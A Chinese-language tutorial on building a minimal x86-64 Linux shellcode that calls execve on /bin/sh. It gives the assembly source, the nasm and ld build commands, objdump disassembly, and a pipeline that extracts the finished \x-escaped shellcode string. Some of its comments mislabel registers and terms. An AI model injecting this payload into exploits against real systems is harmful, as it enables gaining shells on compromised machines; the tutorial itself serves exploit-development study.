# Linux shellcode demo

在kali 202001中运行命令：
```
mkdir -p ~/shellcodes/demo

cd ~/shellcodes/demo

vim demo.asm

```

在vim编辑界面中键入以下内容：
```asm

section .text
        global _start

_start:
        xor rdx,rdx
        push rdx        ;execve() 第4个参数，指定为0
        mov rax,0x68732f6e69622f  ;字符串"/bin//sh"，即待执行命令
        push rax        ;execve() 第3个参数
        mov rdi,rsp     ;
        push rdx        ; 第2个参数
        push rdi        ; 第1个参数
        mov rsi,rsp     ; RSI 指向堆栈中的第1个参数
        xor rax,rax     
        mov al,0x3b     ;将中断向量表索引置入al， 此0x3b指 linux execve()
        syscall

```

然后，使用nasm汇编。

```nasm -g -f elf64 -o demo.o demo.asm```

- g表示生成调试信息
- f表示生成文件格式


接下来使用链接命令```ld```

```ld -o demo  demo.o```

最终生成可执行的elf64文件 demo，运行```./demo```可进入shell执行环境。


查看demo的机器码：```objdump -d ./demo```

内容如下:
```
./demo:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 d2             	xor    %rdx,%rdx
  401003:	52                   	push   %rdx
  401004:	48 b8 2f 62 69 6e 2f 	movabs $0x68732f6e69622f,%rax
  40100b:	73 68 00 
  40100e:	50                   	push   %rax
  40100f:	48 89 e7             	mov    %rsp,%rdi
  401012:	52                   	push   %rdx
  401013:	57                   	push   %rdi
  401014:	48 89 e6             	mov    %rsp,%rsi
  401017:	48 31 c0             	xor    %rax,%rax
  40101a:	b0 3b                	mov    $0x3b,%al
  40101c:	0f 05                	syscall 

```

为了获得上述信息中的纯净opcode，可以使用正则表达式过滤掉无用信息：

``` objdump -d ./demo |grep '[0-9a-z]:' |grep -v 'file' | cut -f2 -d : |cut -f1-7 -d ' '|tr -s ' '|tr "\t" ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s|sed 's/^/"/g'|sed 's/$/"/g'```

结果如下：
```"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"```


## 参考

- [Searchable Linux Syscall Table for x86 and x86_64](https://filippo.io/linux-syscall-table/) 